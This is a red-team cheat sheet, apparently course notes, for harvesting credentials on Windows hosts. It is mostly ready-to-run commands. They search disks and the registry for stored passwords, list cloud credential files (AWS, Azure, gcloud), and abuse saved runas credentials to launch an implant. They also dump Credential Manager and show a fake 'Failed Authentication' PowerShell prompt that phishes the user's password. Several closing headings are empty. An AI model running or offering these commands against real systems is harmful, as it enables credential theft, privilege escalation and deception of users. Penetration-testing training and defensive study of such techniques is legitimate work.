# RTO Sektor 7 Cheat Sheet

### Credentials

- Search for password

```
C:\> dir /b /a /s c:\ > c:\rto\c-dirs.txt
C:\> type c:\rto\c-dirs.txt | findstr /i passw
```

- Search for interesting files

```
C:\> type c:\rto\c-dirs.txt | findstr /i ssh
C:\> type c:\rto\c-dirs.txt | findstr /i kdbx
C:\> type c:\rto\c-dirs.txt | findstr /i vnc
```

- Good targets:

  - install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .config, .ini, .xml, .txt, .gpg, .pgp, .p12, .der, .csr, .cer, id_rsa, id_dsa, .ovpn, .rdp, vnc, ftp, ssh, vpn, git, .kdbx, .db
  - unattend.xml
  - Unattended.xml
  - sysprep.inf
  - sysprep.xml
  - VARIABLES.DAT
  - setupinfo
  - setupinfo.bak
  - web.config
  - SiteList.xml
  - .aws\credentials
  - .azure\accessTokens.json
  - .azure\azureProfile.json
  - gcloud\credentials.db
  - gcloud\legacy_credentials
  - gcloud\access_tokens.db
 
- Search for passwords in the Registry

```
C:\> reg query "HKCU\Software\ORL\WinVNC3\Password"
C:\> reg query "HKCU\Software\TightVNC\Server"
C:\> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
C:\> reg query "HKCU\Software\OpenSSH\Agent\Keys"
C:\> reg query HKLM /f password /t REG_SZ /s
C:\> reg query HKCU /f password /t REG_SZ /s
```

- Abuse Credential Manager

```
C:\> cmdkey /list
C:\> runas /savecred /user:admin cmd.exe
C:\> runas /savecred /user:admin c:\rto\lpe\implant\implant.exe
C:\> runas /savecred /user:admin "c:\windows\system32\cmd /c dir /b /a /s c:\users\admin > c:\rto\admin.txt"
```

- Rob Credential Manager

```
C:\> powershell Import-Module c:\rto\lpe\cms.ps1 ; Enum-Creds
```

- Ask user for credentials using a trick prompt

```
C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
```

### Unsecured Objects

### Execution Flow Hijacking

### Getting SYSTEM
